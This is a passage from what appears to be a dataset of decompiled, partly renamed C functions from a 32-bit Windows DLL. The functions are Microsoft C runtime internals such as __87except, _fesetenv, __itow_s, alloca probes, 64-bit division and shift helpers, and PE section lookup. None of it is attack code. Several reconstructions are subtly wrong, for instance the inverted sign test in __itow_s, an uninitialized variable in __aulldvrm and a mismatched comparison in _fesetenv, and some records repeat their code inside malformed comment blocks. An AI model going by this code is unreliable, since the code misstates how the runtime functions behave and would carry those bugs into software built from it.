*)PTR__guard_check_icall_1003a2f8)(&local_28); \n        iVar3 = (*pcVar2)(); \n        if (iVar3 == 0) {\n            puVar4 = (undefined4 *)FUN_100253b8(); \n            *puVar4 = 0x22; \n        }\n    } else {\n        \n        if (param_4 == 0xf) {\n            local_24 = \"exp\"; \n        } else if (param_4 == 0x18) {\n            local_28 = 3; \n            local_24 = \"pow\"; \n        } else if (param_4 == 0x19) {\n            local_24 = \"pow\"; \n        } else {\n            goto LAB_100363e2; \n        }\n        local_28 = 4; \n        \n        local_20 = *param_1;\n        local_18 = *param_2;\n        local_10 = *param_3;\n        (*(code *)PTR__guard_check_icall_1003a2f8)(&local_28); \n        (*pcVar2)(); \n    }\nLAB_100363dd:\n    *param_3 = local_10; \nLAB_100363e2:\n    ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc); \n    return; \n}"}
{"Function Name": "__87except", "Address": "100363f2", "Source Code": "void __cdecl __87except(int error_code, int *error_info, ushort *error_type)\n{\n    uint exception_type; \n    uint error_value = (uint)*error_type; \n    int error_code_value = *error_info; \n    uint security_cookie = DAT_1004e008 ^ (uint)&stack0xfffffff0; \n    uint flags = 0; \n    \n    if (error_code_value == 1) {\n        exception_type = 8; \n    } else if (error_code_value == 2) {\n        exception_type = 4; \n    } else if (error_code_value == 3) {\n        exception_type = 0x11; \n    } else if (error_code_value == 4) {\n        exception_type = 0x12; \n    } else if (error_code_value == 5) {\n        exception_type = 8; \n    } else if (error_code_value == 8) {\n        exception_type = 0x10; \n    } else {\n        goto LAB_100364bc; \n    }\n    \n    bool is_handled = __handle_exc(exception_type, (double *)(error_info + 6), error_value);\n    if (!is_handled) { \n        \n        if (error_code == 0x10 || error_code == 0x16 || error_code == 0x1d) {\n            flags |= 3; \n        } else {\n            flags &= 0xfffffffe; \n        }\n        \n        __raise_exc((uint[12]){0}, &error_value, exception_type, error_code, (undefined8 *)(error_info + 2), (undefined8 *)(error_info + 6));\n    }\nLAB_100364bc:\n    \n    __ctrlfp(error_value, 0xffff);\n    \n    if ((*error_info == 8 || !___acrt_has_user_matherr() || ___acrt_invoke_user_matherr(error_info) == 0)) {\n        __set_errno_from_matherr(*error_info); \n    }\n    \n    ___security_check_cookie_4(security_cookie ^ (uint)&stack0xfffffff0);\n    return; \n}"}
{"Function Name": "_fegetenv", "Address": "10036513", "Source Code": "undefined4 __cdecl _fegetenv(uint *fp_control_status)\n{\n    \n    fp_control_status[0] = __getfpcontrolword();\n    \n    \n    fp_control_status[1] = __getfpstatusword();\n    \n    \n    return 0;\n}"}
{"Function Name": "_fesetenv", "Address": "10036530", "Source Code": "undefined4 __cdecl _fesetenv(uint *floating_point_env)\n{\n    \n    __setfpcontrolword(*floating_point_env);\n    \n    \n    __setfpstatusword(floating_point_env[1]);\n    \n    uint current_env; \n    \n    \n    _fegetenv(&current_env);\n    \n    \n    return ((*floating_point_env == current_env) && (floating_point_env[1] == 0)) ? 0 : 1;\n}"}
{"Function Name": "_feholdexcept", "Address": "10036579", "Source Code": "undefined4 __cdecl _feholdexcept(uint *output_env)\n{\n    uint fp_env = 0; \n    if (get_fp_env(&fp_env) == 0) { \n        output_env[1] = 0; \n        *output_env = fp_env; \n        fp_env |= 0x1f; \n        if (set_fp_env(&fp_env) == 0) { \n            clear_fp_exceptions(); \n            return 0; \n        }\n    }\n    return 1; \n}"}
{"Function Name": "common_xtox<unsigned_long,wchar_t>", "Address": "1003683d", "Source Code": "\\*\nint __cdecl\ncommon_xtox<unsigned_long,wchar_t>\n(ulong param_1,wchar_t *param_2,uint param_3,uint param_4,bool param_5)\n{\n    short sVar1; \n    wchar_t *pwVar2; \n    wchar_t wVar3; \n    int iVar5; \n    uint uVar6; \n    \n    if (param_5) {\n        *param_2 = L'-'; \n        param_1 = -param_1; \n        pwVar2 = param_2 + 1; \n    } else {\n        pwVar2 = param_2; \n    }\n    uVar6 = (uint)param_5; \n    \n    do {\n        sVar1 = (short)(param_1 % param_4); \n        \n        wVar3 = (param_1 % param_4 < 10) ? sVar1 + L'0' : sVar1 + L'W'; \n        *pwVar2++ = wVar3; \n        uVar6++; \n    } while ((param_1 /= param_4) != 0 && uVar6 < param_3); \n    \n    if (uVar6 < param_3) {\n        *pwVar2 = L'\\0'; \n        wchar_t *start = param_2 + (param_5 ? 1 : 0); \n        wchar_t *end = pwVar2 - 1; \n        \n        while (start < end) {\n            wchar_t temp = *start; \n            *start++ = *end; \n            *end-- = temp; \n        }\n        iVar5 = 0; \n    } else {\n        *param_2 = L'\\0'; \n        (void)FUN_100253b8(); \n        iVar5 = 0x22; \n        FUN_1001de96(); \n    }\n    return iVar5; \n}\n*\\ \n \nint __cdecl\ncommon_xtox<unsigned_long,wchar_t>\n(ulong param_1,wchar_t *param_2,uint param_3,uint param_4,bool param_5)\n{\nshort sVar1;\nwchar_t *pwVar2;\nwchar_t wVar3;\nint iVar5;\nuint uVar6;\nif (param_5) {\n    *param_2 = L'-';\n    param_1 = -param_1;\n    pwVar2 = param_2 + 1;\n} else {\n    pwVar2 = param_2;\n}\nuVar6 = (uint)param_5;\ndo {\n    sVar1 = (short)(param_1 % param_4);\n    wVar3 = (param_1 % param_4 < 10) ? sVar1 + L'0' : sVar1 + L'W';\n    *pwVar2++ = wVar3;\n    uVar6++;\n} while ((param_1 /= param_4) != 0 && uVar6 < param_3);\nif (uVar6 < param_3) {\n    *pwVar2 = L'\\0';\n    wchar_t *start = param_2 + (param_5 ? 1 : 0);\n    wchar_t *end = pwVar2 - 1;\n    while (start < end) {\n        wchar_t temp = *start;\n        *start++ = *end;\n        *end-- = temp;\n    }\n    iVar5 = 0;\n} else {\n    *param_2 = L'\\0';\n    (void)FUN_100253b8();\n    iVar5 = 0x22;\n    FUN_1001de96();\n}\nreturn iVar5;\n}"}
{"Function Name": "common_xtox_s<unsigned_long,wchar_t>", "Address": "100368cb", "Source Code": "\\*\nint __cdecl\ncommon_xtox_s<unsigned_long,wchar_t>\n(ulong param_1,wchar_t *param_2,uint param_3,uint param_4,bool param_5)\n{\n    int iVar2; \n    \n    if ((param_2 != (wchar_t *)0x0) && (param_3 != 0)) {\n        *param_2 = L'\\0'; \n        \n        if (param_3 <= param_5 + 1) {\n            iVar2 = 0x22; \n            goto LAB_100368df; \n        }\n        \n        if (param_4 - 2 < 0x23) {\n            \n            return common_xtox<unsigned_long,wchar_t>(param_1,param_2,param_3,param_4,param_5);\n        }\n    }\n    iVar2 = 0x16; \nLAB_100368df:\n    *(int *)FUN_100253b8() = iVar2; \n    FUN_1001de96(); \n    return iVar2; \n}\n*\\ \n \nint __cdecl\ncommon_xtox_s<unsigned_long,wchar_t>\n(ulong param_1,wchar_t *param_2,uint param_3,uint param_4,bool param_5)\n{\nint iVar2;\nif ((param_2 != (wchar_t *)0x0) && (param_3 != 0)) {\n    *param_2 = L'\\0';\n    if (param_3 <= param_5 + 1) {\n        iVar2 = 0x22;\n        goto LAB_100368df;\n    }\n    if (param_4 - 2 < 0x23) {\n        return common_xtox<unsigned_long,wchar_t>(param_1,param_2,param_3,param_4,param_5);\n    }\n}\niVar2 = 0x16;\nLAB_100368df:\n*(int *)FUN_100253b8() = iVar2;\nFUN_1001de96();\nreturn iVar2;\n}"}
{"Function Name": "__itow_s", "Address": "1003692a", "Source Code": "errno_t __cdecl __itow_s(int value, wchar_t *destinationBuffer, size_t bufferSize, int base)\n{\n    \n    \n    \n    \n    \n    \n    \n    return common_xtox_s<unsigned_long, wchar_t>(value, destinationBuffer, bufferSize, base, (base != 10 && value >= 0));\n}"}
{"Function Name": "__wcsnicmp_l", "Address": "10036a19", "Source Code": "int __cdecl __wcsnicmp_l(wchar_t *str1, wchar_t *str2, size_t maxCount, _locale_t locale)\n{\n    wchar_t char1; \n    wchar_t char2; \n    int comparisonResult = 0; \n    localeinfo_struct localeInfo; \n    if (maxCount != 0) { \n        if ((str1 == (wchar_t *)0x0) || (str2 == (wchar_t *)0x0)) { \n            undefined4 *errorCodePointer = (undefined4 *)FUN_100253b8(); \n            *errorCodePointer = 0x16; \n            FUN_1001de96(); \n            comparisonResult = 0x7fffffff; \n        } else {\n            FUN_1001bfff(&localeInfo, (__acrt_ptd **)locale); \n            if ((localeInfo.locinfo)->locale_name[2] == (wchar_t *)0x0) { \n                do {\n                    char1 = *str1; \n                    if ((0x40 < (ushort)char1) && ((ushort)char1 < 0x5b)) { \n                        char1 += L' '; \n                    }\n                    char2 = *str2; \n                    if ((0x40 < (ushort)char2) && ((ushort)char2 < 0x5b)) { \n                        char2 += L' '; \n                    }\n                    str1++; \n                    str2++; \n                    maxCount--; \n                } while ((maxCount != 0) && (char1 != L'\\0') && (char1 == char2)); \n            } else {\n                do {\n                    char1 = __towlower_l(*str1, &localeInfo); \n                    char2 = __towlower_l(*str2, &localeInfo); \n                    maxCount--; \n                    str1++; \n                    str2++; \n                    if ((maxCount == 0) || (char1 == L'\\0')) break; \n                } while (char1 == char2); \n            }\n            comparisonResult = (uint)(ushort)char1 - (uint)(ushort)char2; \n        }\n    }\n    return comparisonResult; \n}"}
{"Function Name": "___dcrt_lowio_initialize_console_output", "Address": "10036b20", "Source Code": "void ___dcrt_lowio_initialize_console_output(void)\n{\n    \n    \n    \n    \n    \n    \n    \n    \n    initializeConsoleOutputHandle(L\"CONOUT$\", 0x40000000, 3, NULL, 3, 0, NULL);\n}"}
{"Function Name": "FUN_10036ed0", "Address": "10036ed0", "Source Code": "float10 __cdecl FUN_10036ed0(double input_value)\n{\n    uint control_word; \n    float10 result_float10; \n    double result_double; \n    \n    control_word = __ctrlfp(0x1b3f, 0xffff);\n    \n    \n    if ((input_value._6_2_ & 0x7ff0) == 0x7ff0) {\n        \n        if (__sptype(SUB84(input_value, 0), (uint)((ulonglong)input_value >> 0x20)) - 1U < 3) {\n            \n            __ctrlfp(control_word, 0xffff);\n            return (float10)input_value;\n        }\n        \n        result_double = DAT_10048578 + input_value;\n    } else {\n        \n        result_float10 = FUN_100364fd(input_value);\n        \n        \n        if ((NAN((float10)input_value) || NAN(result_float10) != ((float10)input_value == result_float10)) || ((control_word & 0x20) != 0)) {\n            \n            __ctrlfp(control_word, 0xffff);\n            return (float10)(double)result_float10;\n        }\n        \n        result_double = (double)result_float10;\n    }\n    \n    \n    result_float10 = (float10)__except1(8, 0xc, input_value, result_double, control_word);\n    return result_float10; \n}"}
{"Function Name": "___ascii_strnicmp", "Address": "10036f90", "Source Code": "int __cdecl ___ascii_strnicmp(char *str1, char *str2, size_t maxCount)\n{\n    byte currentCharStr1; \n    char currentCharStr2; \n    if (maxCount != 0) { \n        do {\n            currentCharStr1 = *str1; \n            currentCharStr2 = *str2; \n            if (currentCharStr1 == 0 || currentCharStr2 == 0) break; \n            str1++; \n            str2++; \n            if ((0x40 < currentCharStr1) && (currentCharStr1 < 0x5b)) { \n                currentCharStr1 += 0x20; \n            }\n            if ((0x40 < currentCharStr2) && (currentCharStr2 < 0x5b)) { \n                currentCharStr2 += 0x20; \n            }\n            if (currentCharStr1 != currentCharStr2) { \n                return (currentCharStr1 < currentCharStr2) ? 0xffffffff : 1; \n            }\n            maxCount--; \n        } while (maxCount != 0); \n    }\n    return 0; \n}"}
{"Function Name": "FUN_10036ff7", "Address": "10036ff7", "Source Code": "void FUN_10036ff7(void)\n{\n    undefined4 *base_pointer; \n    exception_list = (void *)base_pointer[-3]; \n    return; \n}"}
{"Function Name": "__EH_prolog3", "Address": "1003701d", "Source Code": "void __cdecl __EH_prolog3(int input_param)\n{\n    \n    int negated_param = -input_param;\n    \n    \n    uint unsigned_int_array[5];\n    \n    \n    undefined undefined_byte_array[8];\n    \n    *(undefined4 *)((int)unsigned_int_array + negated_param + 0x10) = ebx_value;\n    \n    \n    *(undefined4 *)((int)unsigned_int_array + negated_param + 0xc) = esi_value;\n    \n    \n    *(undefined4 *)((int)unsigned_int_array + negated_param + 8) = edi_value;\n    \n    \n    *(uint *)((int)unsigned_int_array + negated_param + 4) = constant_value ^ (uint)&input_param;\n    \n    \n    *(undefined4 *)((int)unsigned_int_array + negated_param) = return_address;\n    \n    \n    exception_list = undefined_byte_array;\n    \n    \n    return;\n}"}
{"Function Name": "__EH_prolog3_GS", "Address": "10037051", "Source Code": "void __cdecl __EH_prolog3_GS(int input_value)\n{\n    \n    int negated_value = -input_value;\n    \n    \n    uint stack_values[5];\n    \n    \n    *(undefined4 *)((int)stack_values + negated_value + 0x10) = register_EBX;\n    \n    \n    *(undefined4 *)((int)stack_values + negated_value + 0xc) = register_ESI;\n    \n    \n    *(undefined4 *)((int)stack_values + negated_value + 8) = register_EDI;\n    \n    \n    *(uint *)((int)stack_values + negated_value + 4) = data_value ^ (uint)&input_value;\n    \n    \n    *(undefined4 *)((int)stack_values + negated_value) = return_address;\n    \n    \n    exception_list = (undefined *)0;\n    \n    \n    return;\n}"}
{"Function Name": "__EH_prolog3_catch", "Address": "10037088", "Source Code": "void __cdecl __EH_prolog3_catch(int input_param)\n{\n    \n    int negated_param = -input_param;\n    \n    uint stack_data[5];\n    \n    *(undefined4 *)((int)stack_data + negated_param + 0x10) = ebx_value;\n    \n    *(undefined4 *)((int)stack_data + negated_param + 0xc) = esi_value;\n    \n    *(undefined4 *)((int)stack_data + negated_param + 8) = edi_value;\n    \n    *(uint *)((int)stack_data + negated_param + 4) = data_value ^ (uint)&input_param;\n    \n    *(undefined4 *)((int)stack_data + negated_param) = return_address;\n    \n    exception_list = (undefined *)0;\n    \n    return;\n}"}
{"Function Name": "__alloca_probe_16", "Address": "100370c0", "Source Code": "uint allocate_memory_probe(undefined1 alignment_param)\n{\n    \n    \n    return eax_value + (4 - eax_value & 0xf) | \n           -(uint)handle_carry(eax_value, 4 - eax_value & 0xf); \n}"}
{"Function Name": "__alloca_probe_8", "Address": "100370d6", "Source Code": "uint __alloca_probe_8(undefined1 input_param)\n{\n    \n    \n    \n    return eax_value + (4 - eax_value & 7) | \n           \n           \n           -(uint)carry_check(eax_value, 4 - eax_value & 7);\n}"}
{"Function Name": "__allmul", "Address": "100370f0", "Source Code": "longlong __allmul(uint first_operand, uint second_operand, uint third_operand, uint fourth_operand)\n{\n    \n    if ((fourth_operand | second_operand) == 0) {\n        \n        return (ulonglong)first_operand * (ulonglong)third_operand;\n    }\n    \n    return CONCAT44(\n        \n        \n        (int)((ulonglong)first_operand * (ulonglong)third_operand >> 0x20) + second_operand * third_operand + first_operand * fourth_operand,\n        \n        \n        (int)((ulonglong)first_operand * (ulonglong)third_operand)\n    );\n}"}
{"Function Name": "__aulldiv", "Address": "10037130", "Source Code": "undefined8 __aulldiv(uint numerator, uint denominator, uint divisorParam, uint adjustment)\n{\n    ulonglong result; \n    longlong intermediate;  \n    uint dividend = numerator; \n    uint halfDivisor, divisor = denominator, adjustedValue = adjustment, remainder = divisorParam; \n    int quotient; \n    if (adjustment == 0) { \n        dividend = denominator / divisorParam; \n        quotient = (int)(((ulonglong)denominator % (ulonglong)divisorParam << 0x20 | (ulonglong)numerator) / (ulonglong)divisorParam); \n    } else {\n        do {\n            halfDivisor = adjustedValue >> 1; \n            remainder = remainder >> 1 | (uint)((adjustedValue & 1) != 0) << 0x1f; \n            dividend = dividend >> 1 | (uint)((divisor & 1) != 0) << 0x1f; \n            adjustedValue = halfDivisor; \n            divisor >>= 1; \n        } while (halfDivisor != 0); \n        result = CONCAT44(divisor, dividend) / (ulonglong)remainder; \n        quotient = (int)result; \n        intermediate = (ulonglong)divisorParam * (result & 0xffffffff); \n        dividend = (uint)((ulonglong)intermediate >> 0x20); \n        adjustedValue = dividend + quotient * adjustment; \n        if (CARRY4(dividend, quotient * adjustment) || (denominator < adjustedValue) || (denominator <= adjustedValue && (numerator < (uint)intermediate))) { \n            quotient--; \n        }\n    }\n    return CONCAT44(dividend, quotient); \n}"}
{"Function Name": "__FindPESection", "Address": "100371a0", "Source Code": "PIMAGE_SECTION_HEADER __cdecl __FindPESection(PBYTE imageBase, DWORD_PTR relativeVirtualAddress)\n{\n    \n    int peHeaderOffset = *(int *)(imageBase + 0x3c);\n    \n    \n    PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)(imageBase + *(ushort *)(imageBase + peHeaderOffset + 0x14) + 0x18 + peHeaderOffset);\n    \n    \n    ushort numberOfSections = *(ushort *)(imageBase + peHeaderOffset + 6);\n    \n    for (uint sectionIndex = 0; sectionIndex < numberOfSections; sectionIndex++, sectionHeader++) {\n        \n        if (sectionHeader->VirtualAddress <= relativeVirtualAddress && relativeVirtualAddress < (sectionHeader->Misc).PhysicalAddress + sectionHeader->VirtualAddress) {\n            \n            return sectionHeader;\n        }\n    }\n    \n    \n    return (PIMAGE_SECTION_HEADER)0x0;\n}"}
{"Function Name": "__IsNonwritableInCurrentImage", "Address": "100371f0", "Source Code": "BOOL __cdecl __IsNonwritableInCurrentImage(PBYTE targetAddress)\n{\n    PIMAGE_SECTION_HEADER sectionHeader; \n    \n    if (__ValidateImageBase((PBYTE)&IMAGE_DOS_HEADER_10000000)) {\n        \n        sectionHeader = __FindPESection((PBYTE)&IMAGE_DOS_HEADER_10000000, (DWORD_PTR)(targetAddress + -0x10000000));\n        \n        \n        if (sectionHeader != (PIMAGE_SECTION_HEADER)0x0) {\n            \n            return ~(sectionHeader->Characteristics >> 0x1f) & 1;\n        }\n    }\n    \n    return 0;\n}"}
{"Function Name": "__ValidateImageBase", "Address": "100372b0", "Source Code": "BOOL __cdecl __ValidateImageBase(PBYTE imageBase)\n{\n    \n    return ((*(short *)imageBase == 0x5a4d) &&\n            \n            (*(int *)(imageBase + *(int *)(imageBase + 0x3c)) == 0x4550) &&\n            \n            (*(short *)((int)(imageBase + *(int *)(imageBase + 0x3c)) + 0x18) == 0x10b));\n}"}
{"Function Name": "__aulldvrm", "Address": "100372f0", "Source Code": "undefined8 __aulldvrm(uint dividend, uint numerator, uint denominator, uint divisor)\n{\n    ulonglong result; \n    longlong product;  \n    uint quotient;     \n    int integerPart;      \n    uint halfDivisor;     \n    uint adjustedNumerator;     \n    uint adjustedDivisor;     \n    \n    if (divisor == 0) {\n        quotient = numerator / denominator; \n        \n        integerPart = (int)(((ulonglong)numerator % (ulonglong)denominator << 0x20 | (ulonglong)dividend) / (ulonglong)denominator);\n    } else {\n        adjustedNumerator = numerator; \n        adjustedDivisor = divisor; \n        do {\n            halfDivisor = adjustedDivisor >> 1; \n            \n            adjustedNumerator = adjustedNumerator >> 1 | (uint)((adjustedDivisor & 1) != 0) << 0x1f;\n            adjustedDivisor = halfDivisor; \n        } while (halfDivisor != 0); \n        \n        result = CONCAT44(adjustedNumerator, quotient) / (ulonglong)denominator;\n        integerPart = (int)result; \n        product = (ulonglong)denominator * (result & 0xffffffff); \n        \n        quotient = (uint)((ulonglong)product >> 0x20) + integerPart * divisor;\n        \n        if (CARRY4(quotient, integerPart * divisor) || (numerator < quotient) || (numerator <= quotient && (dividend < (uint)product))) {\n            integerPart--; \n        }\n        quotient = 0; \n    }\n    return CONCAT44(quotient, integerPart); \n}"}
{"Function Name": "__SEH_prolog4_GS", "Address": "10037390", "Source Code": "void __cdecl __SEH_prolog4_GS(undefined4 input_param_1, int input_param_2)\n{\n    int negated_param_2; \n    uint temp_values_stack[5]; \n    undefined exception_list[8]; \n    negated_param_2 = -input_param_2; \n    *(undefined4 *)((int)temp_values_stack + negated_param_2 + 0x10) = saved_EBX; \n    *(undefined4 *)((int)temp_values_stack + negated_param_2 + 0xc) = saved_ESI; \n    *(undefined4 *)((int)temp_values_stack + negated_param_2 + 8) = saved_EDI; \n    *(uint *)((int)temp_values_stack + negated_param_2 + 4) = xor_value ^ (uint)&input_param_2; \n    *(undefined4 *)((int)temp_values_stack + negated_param_2) = saved_return_address; \n    exception_list_pointer = exception_list; \n    return; \n}"}
{"Function Name": "__allshl", "Address": "100373f0", "Source Code": "longlong __fastcall __allshl(byte shift_amount, int value)\n{\n    \n    if (0x3f < shift_amount) {\n        return 0; \n    }\n    \n    \n    if (shift_amount < 0x20) {\n        \n        return CONCAT44(value << (shift_amount & 0x1f), value >> (0x20 - (shift_amount & 0x1f)));\n    }\n    \n    \n    return (ulonglong)value << 0x20;\n}"}
{"Function Name": "__aullshr", "Address": "10037410", "Source Code": "ulonglong __fastcall __aullshr(byte shift_amount, uint value)\n{\n    \n    if (shift_amount > 0x3f) {\n        return 0; \n    }\n    \n    \n    if (shift_amount < 0x20) {\n        \n        \n        return CONCAT44(value >> (shift_amount & 0x1f), value << (0x20 - (shift_amount & 0x1f)) >> (shift_amount & 0x1f));\n    }\n    \n    \n    return (ulonglong)(value >> (shift_amount & 0x1f));\n}"}
{"Function Name": "__alldvrm", "Address": "10037430", "Source Code": "undefined8 __alldvrm(uint param_1, uint param_2, uint param_3, uint param_4)\n{\n    ulonglong intermediateResult; \n    longlong longLongResult;  \n    uint finalQuotient;      \n    int finalRemainder;       \n    uint adjustedDivisor;      \n    uint adjustedDividend;      \n    uint intermediateCalculation;      \n    uint shiftingOperation;      \n    bool conditionFlag;     \n    char signCheck;     \n    signCheck = (int)param_2 < 0; \n    if (signCheck) {\n        conditionFlag = param_1 != 0; \n        param_1 = -param_1;    \n        param_2 = -(uint)conditionFlag - param_2; \n    }\n    if ((int)param_4 < 0) {\n        signCheck++; \n        conditionFlag = param_3 != 0; \n        param_3 = -param_3;    \n        param_4 = -(uint)conditionFlag - param_4; \n    }\n    finalQuotient = param_1; \n    adjustedDivisor = param_3; \n    adjustedDividend = param_2; \n    if (param_4 == 0) { \n        finalQuotient = param_2 / param_3; \n        finalRemainder = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) / (ulonglong)param_3); \n    } else {\n        do {\n            shiftingOperation = param_4 >> 1; \n            adjustedDivisor = adjustedDivisor >> 1 | (uint)((param_4 & 1) != 0) << 0x1f; \n            intermediateCalculation = adjustedDividend >> 1; \n            finalQuotient = finalQuotient >> 1 | (uint)((adjustedDividend & 1) != 0) << 0x1f; \n            adjustedDividend = intermediateCalculation; \n            param_4 = shiftingOperation; \n        } while (shiftingOperation != 0); \n        intermediateResult = CONCAT44(intermediateCalculation, finalQuotient) / (ulonglong)adjustedDivisor; \n        finalRemainder = (int)intermediateResult; \n        longLongResult = (ulonglong)param_3 * (intermediateResult & 0xffffffff); \n        finalQuotient = (uint)((ulonglong)longLongResult >> 0x20); \n        adjustedDivisor = finalQuotient + finalRemainder * param_4; \n        \n        if (CARRY4(finalQuotient, finalRemainder * param_4) || (param_2 < adjustedDivisor) || (param_2 <= adjustedDivisor && (param_1 < (uint)longLongResult))) {\n            finalRemainder--; \n        }\n        finalQuotient = 0; \n    }\n    if (signCheck) { \n        conditionFlag = finalRemainder != 0; \n        finalRemainder = -finalRemainder; \n        finalQuotient = -(uint)conditionFlag - finalQuotient; \n    }\n    return CONCAT44(finalQuotient, finalRemainder); \n}"}
{"Function Name": "__alloca_probe", "Address": "10037510", "Source Code": "void __alloca_probe(void)\n{\n    undefined4 *pointerToUndefined4; \n    undefined4 returnAddress; \n    undefined stackAllocation[4]; \n    \n    pointerToUndefined4 = (undefined4 *)((int)&stack0x00000000 - (int)in_EAX & ~-(uint)(&stack0x00000000 < in_EAX));\n    \n    \n    for (undefined4 *pointerToAlignedAddress = (undefined4 *)((uint)stackAllocation & 0xfffff000); pointerToUndefined4 < pointerToAlignedAddress; pointerToAlignedAddress -= 0x400) {\n        \n    }\n    \n    \n    *pointerToUndefined4 = returnAddress;\n}"}
{"Function Name": "__alldiv", "Address": "10037540", "Source Code": "undefined8 __alldiv(uint dividend, uint divisor, uint value3, uint value4)\n{\n    ulonglong result; \n    longlong intermediateProduct;  \n    uint quotient;      \n    int integerPart;       \n    uint adjustedParam3;      \n    uint adjustedParam2;      \n    uint shiftedParam4;      \n    uint shiftedParam3;      \n    bool isNonZero;     \n    char isParam2Negative;     \n    isParam2Negative = (int)divisor < 0; \n    if (isParam2Negative) {\n        isNonZero = dividend != 0; \n        dividend = -dividend;    \n        divisor = -(uint)isNonZero - divisor; \n    }\n    if ((int)value4 < 0) {\n        isParam2Negative++; \n        isNonZero = value3 != 0; \n        value3 = -value3;    \n        value4 = -(uint)isNonZero - value4; \n    }\n    quotient = dividend; \n    adjustedParam3 = value3; \n    adjustedParam2 = divisor; \n    if (value4 == 0) { \n        quotient = divisor / value3; \n        integerPart = (int)(((ulonglong)divisor % (ulonglong)value3 << 0x20 | (ulonglong)dividend) / (ulonglong)value3); \n    } else {\n        do {\n            shiftedParam3 = value4 >> 1; \n            adjustedParam3 = adjustedParam3 >> 1 | (uint)((value4 & 1) != 0) << 0x1f; \n            shiftedParam4 = adjustedParam2 >> 1; \n            quotient = quotient >> 1 | (uint)((adjustedParam2 & 1) != 0) << 0x1f; \n            adjustedParam2 = shiftedParam4; \n            value4 = shiftedParam3; \n        } while (shiftedParam3 != 0); \n        result = CONCAT44(shiftedParam4, quotient) / (ulonglong)adjustedParam3; \n        integerPart = (int)result; \n        intermediateProduct = (ulonglong)value3 * (result & 0xffffffff); \n        quotient = (uint)((ulonglong)intermediateProduct >> 0x20); \n        adjustedParam3 = quotient + integerPart * value4; \n        \n        if (CARRY4(quotient, integerPart * value4) || (divisor < adjustedParam3) || (divisor <= adjustedParam3 && (dividend < (uint)intermediateProduct))) {\n            integerPart--; \n        }\n        quotient = 0; \n    }\n    if (isParam2Negative) { \n        isNonZero = integerPart != 0; \n        integerPart = -integerPart; \n        quotient = -(uint)isNonZero - quotient; \n    }\n    return CONCAT44(quotient, integerPart); \n}"}
{"Function Name": "FUN_1003791b", "Address": "1003791b", "Source Code": "\\*\nushort * __cdecl FUN_1003791b(ushort *input_array, ushort search_value)\n{\n    ushort current_value; \n    int index;    \n    \n    if (0 < global_threshold) {\n        undefined shuffled_value = pshuflw(ZEXT216(search_value), ZEXT216(search_value), 0); \n        do {\n            \n            if (((uint)input_array & 0xfff) < 0xff1) {\n                \n                ushort zero_mask = -(ushort)(*input_array == 0) | \n                              (-(ushort)(input_array[1] == 0) << 2) | \n                              (-(ushort)(input_array[2] == 0) << 4) | \n                              (-(ushort)(input_array[3] == 0) << 6) | \n                              (-(ushort)(input_array[4] == 0) << 8) | \n                              (-(ushort)(input_array[5] == 0) << 10) | \n                              (-(ushort)(input_array[6] == 0) << 12) | \n                              (-(ushort)(input_array[7] == 0) << 14);\n                current_value = shuffled_value._0_2_; \n                \n                zero_mask |= (-(ushort)(*input_array == current_value) | \n                         (-(ushort)(input_array[1] == shuffled_value._2_2_) << 2) | \n                         (-(ushort)(input_array[2] == current_value) << 4) | \n                         (-(ushort)(input_array[3] == shuffled_value._2_2_) << 6) | \n                         (-(ushort)(input_array[4] == current_value) << 8) | \n                         (-(ushort)(input_array[5] == shuffled_value._2_2_) << 10) | \n                         (-(ushort)(input_array[6] == current_value) << 12) | \n                         (-(ushort)(input_array[7] == shuffled_value._2_2_) << 14));\n                current_value = (ushort)(zero_mask & 0xFFFF); \n                \n                if (current_value != 0) goto LAB_100379c8;\n                input_array += 0x10; \n            } else {\n                \n                if (*input_array == search_value) {\n                    return input_array;\n                }\n                \n                if (*input_array == 0) {\n                    return (ushort *)0x0;\n                }\n                input_array += 2; \n            }\n        } while (true); \n    }\n    current_value = *input_array; \n    \n    while ((current_value != 0 && (current_value != search_value))) {\n        input_array++; \n        current_value = *input_array; \n    }\nLAB_1003796a:\n    \n    return (ushort *)((current_value != search_value) - 1 & (uint)input_array);\nLAB_100379c8:\n    index = 0; \n    \n    if (current_value != 0) {\n        for (; (current_value >> index & 1) == 0; index++) {} \n    }\n    input_array += index; \n    current_value = *input_array; \n    goto LAB_1003796a; \n}\n*\\ \n \nushort * __cdecl FUN_1003791b(ushort *input_array, ushort search_value)\n{\n    ushort current_value;\n    int index;\n    if (0 < global_threshold) {\n        undefined shuffled_value = pshuflw(ZEXT216(search_value), ZEXT216(search_value), 0);\n        do {\n            if (((uint)input_array & 0xfff) < 0xff1) {\n                ushort zero_mask = -(ushort)(*input_array == 0) | \n                              (-(ushort)(input_array[1] == 0) << 2) | \n                              (-(ushort)(input_array[2] == 0) << 4) | \n                              (-(ushort)(input_array[3] == 0) << 6) | \n                              (-(ushort)(input_array[4] == 0) << 8) | \n                              (-(ushort)(input_array[5] == 0) << 10) | \n                              (-(ushort)(input_array[6] == 0) << 12) | \n                              (-(ushort)(input_array[7] == 0) << 14);\n                current_value = shuffled_value._0_2_;\n                zero_mask |= (-(ushort)(*input_array == current_value) | \n                         (-(ushort)(input_array[1] == shuffled_value._2_2_) << 2) | \n                         (-(ushort)(input_array[2] == current_value) << 4) | \n                         (-(ushort)(input_array[3] == shuffled_value._2_2_) << 6) | \n                         (-(ushort)(input_array[4] == current_value) << 8) | \n                         (-(ushort)(input_array[5] == shuffled_value._2_2_) << 10) | \n                         (-(ushort)(input_array[6] == current_value) << 12) | \n                         (-(ushort)(input_array[7] == shuffled_value._2_2_) << 14));\n                current_value = (ushort)(zero_mask & 0xFFFF);\n                if (current_value != 0) goto LAB_100379c8;\n                input_array += 0x10;\n            } else {\n                if (*input_array == search_value) {\n                    return input_array;\n                }\n                if (*input_array == 0) {\n                    return (ushort *)0x0;\n                }\n                input_array += 2;\n            }\n        } while (true);\n    }\n    current_value = *input_array;\n    while ((current_value != 0 && (current_value != search_value))) {\n        input_array++;\n        current_value = *input_array;\n    }\nLAB_1003796a:\n    return (ushort *)((current_value != search_value) - 1 & (uint)input_array);\nLAB_100379c8:\n    index = 0;\n    if (current_value != 0) {\n        for (; (current_value >> index & 1) == 0; index++) {}\n    }\n    input_array += index;\n    current_value = *input_array;\n    goto LAB_1003796a;\n}"}
